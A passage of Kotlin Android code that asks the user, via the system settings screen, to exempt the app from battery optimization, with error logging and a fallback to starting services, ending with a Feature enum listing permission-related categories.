            Logger.error("Cannot disable battery optimization: Activity is finishing or destroyed")
            return
        }
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            fromBatteryOptimizationSettings = true
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Battery optimization settings failed", e)
            startAllServices()
        }
    }

    enum class Feature {
        RESTRICTED, PHONE, STORAGE, INTERNET, LOCK, WHATSAPP, GENERAL
    }
}